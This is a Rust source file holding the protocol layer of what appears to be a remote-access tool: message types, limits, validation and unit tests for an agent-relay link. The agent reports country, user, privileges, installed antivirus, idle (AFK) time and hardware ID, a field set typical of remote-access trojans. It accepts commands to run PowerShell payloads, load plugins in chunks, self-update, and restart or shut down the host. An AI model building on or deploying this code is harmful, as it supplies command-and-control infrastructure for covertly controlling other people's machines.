use serde::{Deserialize, Serialize};

pub const PROTOCOL_VERSION: u16 = 1;
pub const MAX_WS_MESSAGE_BYTES: usize = 3 * 1024 * 1024;
pub const MAX_COMMAND_BYTES: usize = MAX_WS_MESSAGE_BYTES;
pub const MAX_EXECUTE_BYTES: usize = 2 * 1024 * 1024;
pub const MAX_PLUGIN_BYTES: usize = 256 * 1024 * 1024;
pub const MAX_UPDATE_BYTES: usize = 64 * 1024 * 1024;
pub const MAX_TELEMETRY_FIELDS: usize = 16;
pub const MAX_AGENT_ID_LEN: usize = 128;
pub const MAX_TELEMETRY_FIELD_BYTES: usize = 64 * 1024;
pub const MAX_AUTH_KEY_HEX_LEN: usize = 64;


pub const MAX_CONTROL_FRAME_BYTES: usize = MAX_CONTROL_COMMAND_LEN + 64 * 1024;
pub const MAX_CONTROL_REQUEST_ID_LEN: usize = 64;
pub const MAX_CONTROL_TARGET_LEN: usize = 128;
pub const MAX_CONTROL_COMMAND_LEN: usize = 3 * 1024 * 1024;

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ControlRequest {
    pub protocol_version: u16,
    pub message_type: String,
    pub request_id: String,
    pub target: String,
    pub command: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ControlResponse {
    pub protocol_version: u16,
    pub message_type: String,
    pub request_id: String,
    pub status: String,
    pub target: String,
    pub queued: usize,
    pub dropped: usize,
    pub detail: String,
}

pub fn is_supported_agent_command(command: &str) -> bool {
    let command = command.trim();
    const EXACT: &[&str] = &[
        "REQ:DATA",
        "CMD:RECONNECT",
        "CMD:CLOSE",
        "CMD:SLEEP",
        "CMD:HIBERNATE",
        "CMD:RESTART",
        "CMD:SHUTDOWN",
        "CMD:DIRECT_CONNECT",
        "CMD:DIRECT_DISCONNECT",
    ];
    if EXACT.iter().any(|value| command.eq_ignore_ascii_case(value)) {
        return true;
    }
    const PREFIXES: &[&str] = &[
        "CMD:PLUGIN:",
        "CMD:PLUGIN_BEGIN:",
        "CMD:PLUGIN_CHUNK:",
        "CMD:PLUGIN_END:",
        "CMD:PLUGIN_RESUME:",
        "CMD:PLUGIN_MSG:",
        "CMD:PLUGIN_EVENT:",
        "CMD:UNLOAD:",
        "CMD:UPDATE:",
        "CMD:UPDATE_BEGIN:",
        "CMD:UPDATE_CHUNK:",
        "CMD:UPDATE_END:",
        "CMD:EXECUTE:",
    ];
    PREFIXES.iter().any(|prefix| command.get(..prefix.len()).is_some_and(|head| head.eq_ignore_ascii_case(prefix)))
}

impl ControlRequest {
    pub fn validate(&self) -> Result<(), ProtocolError> {
        if self.protocol_version != PROTOCOL_VERSION || self.message_type != "agent_command" {
            return Err(ProtocolError::UnexpectedMessage);
        }
        if self.request_id.is_empty() || self.request_id.len() > MAX_CONTROL_REQUEST_ID_LEN
            || self.request_id.bytes().any(|b| !b.is_ascii_graphic()) {
            return Err(ProtocolError::InvalidControlField("request_id"));
        }
        if self.target.is_empty() || self.target.len() > MAX_CONTROL_TARGET_LEN {
            return Err(ProtocolError::InvalidControlField("target"));
        }
        if self.command.is_empty() || self.command.len() > MAX_CONTROL_COMMAND_LEN
            || self.command.bytes().any(|b| b == b'\r' || b == b'\n' || b == 0) {
            return Err(ProtocolError::InvalidControlField("command"));
        }
        if !is_supported_agent_command(&self.command) {
            return Err(ProtocolError::InvalidControlField("command"));
        }
        Ok(())
    }
}

pub const COUNTRY: &str = "Country";
pub const NICKNAME: &str = "Nickname";
pub const TAG: &str = "Tag";
pub const USER: &str = "User";
pub const VERSION: &str = "Version";
pub const PRIVILEGES: &str = "Privileges";
pub const OS: &str = "OS";
pub const GPU: &str = "GPU";
pub const CPU: &str = "CPU";
pub const RAM: &str = "RAM";
pub const ANTIVIRUS: &str = "AntiVirus";
pub const UPTIME: &str = "Uptime";
pub const AFK: &str = "AFK";
pub const PING: &str = "Ping";
pub const HWID: &str = "HWID";
pub const FINGERPRINT: &str = "Fingerprint";

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct Telemetry {
    #[serde(rename = "Country")]
    pub country: String,
    #[serde(rename = "Nickname")]
    pub nickname: String,
    #[serde(rename = "Tag")]
    pub tag: String,
    #[serde(rename = "User")]
    pub user: String,
    #[serde(rename = "Version")]
    pub version: String,
    #[serde(rename = "Privileges")]
    pub privileges: String,
    #[serde(rename = "OS")]
    pub os: String,
    #[serde(rename = "GPU")]
    pub gpu: String,
    #[serde(rename = "CPU")]
    pub cpu: String,
    #[serde(rename = "RAM")]
    pub ram: String,
    #[serde(rename = "AntiVirus")]
    pub antivirus: String,
    #[serde(rename = "Uptime")]
    pub uptime: String,
    #[serde(rename = "AFK")]
    pub afk: String,
    #[serde(rename = "Ping")]
    pub ping: String,
    #[serde(rename = "HWID")]
    pub hwid: String,
    #[serde(rename = "Fingerprint")]
    pub fingerprint: String,
}

impl Telemetry {
    pub fn fields(&self) -> [&str; MAX_TELEMETRY_FIELDS] {
        [
            &self.country,
            &self.nickname,
            &self.tag,
            &self.user,
            &self.version,
            &self.privileges,
            &self.os,
            &self.gpu,
            &self.cpu,
            &self.ram,
            &self.antivirus,
            &self.uptime,
            &self.afk,
            &self.ping,
            &self.hwid,
            &self.fingerprint,
        ]
    }

    pub fn validate(&self, expected_fingerprint: &str) -> Result<(), ProtocolError> {
        for (index, value) in self.fields().iter().enumerate() {
            if value.len() > MAX_TELEMETRY_FIELD_BYTES {
                return Err(ProtocolError::FieldTooLong { index });
            }
            if value.contains(['\r', '\n', '|']) {
                return Err(ProtocolError::InvalidField { index });
            }
        }
        if self.fingerprint != expected_fingerprint {
            return Err(ProtocolError::FingerprintMismatch);
        }
        Ok(())
    }
}

pub fn parse_data_line(line: &str) -> Result<Telemetry, ProtocolError> {
    let payload = line.strip_prefix("DATA:").ok_or(ProtocolError::UnexpectedMessage)?;
    let fields: Vec<&str> = payload.split('|').collect();
    if fields.len() != MAX_TELEMETRY_FIELDS {
        return Err(ProtocolError::WrongFieldCount {
            expected: MAX_TELEMETRY_FIELDS,
            actual: fields.len(),
        });
    }
    if fields.iter().any(|v| v.len() > MAX_TELEMETRY_FIELD_BYTES || v.contains(['\r', '\n', '\0'])) {
        return Err(ProtocolError::InvalidField { index: 0 });
    }
    Ok(Telemetry {
        country: fields[0].to_owned(),
        nickname: fields[1].to_owned(),
        tag: fields[2].to_owned(),
        user: fields[3].to_owned(),
        version: fields[4].to_owned(),
        privileges: fields[5].to_owned(),
        os: fields[6].to_owned(),
        gpu: fields[7].to_owned(),
        cpu: fields[8].to_owned(),
        ram: fields[9].to_owned(),
        antivirus: fields[10].to_owned(),
        uptime: fields[11].to_owned(),
        afk: fields[12].to_owned(),
        ping: fields[13].to_owned(),
        hwid: fields[14].to_owned(),
        fingerprint: fields[15].to_owned(),
    })
}

pub fn parse_fingerprint_line(line: &str) -> Result<&str, ProtocolError> {
    let fingerprint = line
        .strip_prefix("HELLO:FINGERPRINT:")
        .ok_or(ProtocolError::UnexpectedMessage)?;
    if fingerprint.len() != 64 || !fingerprint.bytes().all(|b| b.is_ascii_hexdigit()) {
        return Err(ProtocolError::InvalidFingerprint);
    }
    Ok(fingerprint)
}

pub fn auth_message(fingerprint: &str, nonce: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(16 + fingerprint.len() + nonce.len());
    out.extend_from_slice(b"ZTSEC-AUTH-V1\0");
    out.extend_from_slice(fingerprint.as_bytes());
    out.push(0);
    out.extend_from_slice(nonce);
    out
}

#[derive(Debug, Serialize)]
pub struct IpcEnvelope<'a> {
    pub protocol_version: u16,
    pub message_type: &'static str,
    pub agent_id: &'a str,
    pub fingerprint: &'a str,
    pub timestamp_ms: u64,
    pub sequence_number: u64,
    pub telemetry: &'a Telemetry,
}

#[derive(Debug)]
pub enum ProtocolError {
    UnexpectedMessage,
    InvalidFingerprint,
    FingerprintMismatch,
    WrongFieldCount { expected: usize, actual: usize },
    FieldTooLong { index: usize },
    InvalidField { index: usize },
    InvalidControlField(&'static str),
}

impl std::fmt::Display for ProtocolError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::UnexpectedMessage => write!(f, "unexpected protocol message"),
            Self::InvalidFingerprint => write!(f, "invalid fingerprint"),
            Self::FingerprintMismatch => write!(f, "telemetry fingerprint mismatch"),
            Self::WrongFieldCount { expected, actual } =>
                write!(f, "telemetry field count {actual}, expected {expected}"),
            Self::FieldTooLong { index } => write!(f, "telemetry field {index} is too long"),
            Self::InvalidField { index } => write!(f, "telemetry field {index} is invalid"),
            Self::InvalidControlField(field) => write!(f, "invalid control field {field}"),
        }
    }
}

impl std::error::Error for ProtocolError {}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn relay_vocabulary_covers_all_agent_command_families() {
        for command in [
            "REQ:DATA", "CMD:RECONNECT", "CMD:CLOSE", "CMD:SLEEP", "CMD:HIBERNATE",
            "CMD:RESTART", "CMD:SHUTDOWN", "CMD:DIRECT_CONNECT", "CMD:DIRECT_DISCONNECT",
            "CMD:PLUGIN:x:eA==", "CMD:PLUGIN_BEGIN:x:y:1:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            "CMD:PLUGIN_CHUNK:y:0:eA==", "CMD:PLUGIN_END:y", "CMD:PLUGIN_RESUME:y",
            "CMD:PLUGIN_MSG:x:eA==", "CMD:PLUGIN_EVENT:ping", "CMD:UNLOAD:x",
            "CMD:UPDATE:a:ZW1wdHk=", "CMD:UPDATE_BEGIN:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:1",
            "CMD:UPDATE_CHUNK:0:eA==", "CMD:UPDATE_END:", "CMD:EXECUTE:ps1:ZW1wdHk=",
        ] {
            assert!(is_supported_agent_command(command), "not relayable: {command}");
        }
        assert!(!is_supported_agent_command("CMD:SHELL"));
        // Control clients must request server-side direct discovery; they may not inject an address.
        assert!(!is_supported_agent_command("CMD:DIRECT_CONNECT:203.0.113.10:4794"));
    }

    #[test]
    fn valid_control_request_is_accepted() {
        let request = ControlRequest {
            protocol_version: PROTOCOL_VERSION,
            message_type: "agent_command".into(),
            request_id: "req-01".into(),
            target: "a".repeat(64),
            command: "CMD:RECONNECT".into(),
        };
        assert!(request.validate().is_ok());
    }

    #[test]
    fn control_request_rejects_newlines_and_oversized_fields() {
        let mut request = ControlRequest {
            protocol_version: PROTOCOL_VERSION,
            message_type: "agent_command".into(),
            request_id: "req-01".into(),
            target: "broadcast".into(),
            command: "CMD:RECONNECT".into(),
        };
        request.command.push('\n');
        assert!(request.validate().is_err());
        request.command = "x".repeat(MAX_CONTROL_COMMAND_LEN + 1);
        assert!(request.validate().is_err());
    }

    #[test]
    fn parse_existing_telemetry_shape() {
        let line = "DATA:Local|host|ZTSecurity|user|Rust-Native/1|User|Windows|GPU|CPU|8/16 GB|AV|1h 2m|0m|1 ms|hwid|abcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcd";
        let telemetry = parse_data_line(line).unwrap();
        assert_eq!(telemetry.fields().len(), 16);
        assert_eq!(telemetry.fingerprint.len(), 64);
    }

    #[test]
    fn rejects_wrong_field_count() {
        assert!(matches!(
            parse_data_line("DATA:a|b"),
            Err(ProtocolError::WrongFieldCount { .. })
        ));
    }

    #[test]
    fn rejects_control_characters() {
        assert!(parse_data_line("DATA:a|b|c|d|e|f|g|h|i|j|k|l|m|n|bad\nfield|fp").is_err());
    }

    #[test]
    fn auth_message_binds_nonce_and_fingerprint() {
        assert_ne!(auth_message("a", &[1]), auth_message("a", &[2]));
        assert_ne!(auth_message("a", &[1]), auth_message("b", &[1]));
    }
}
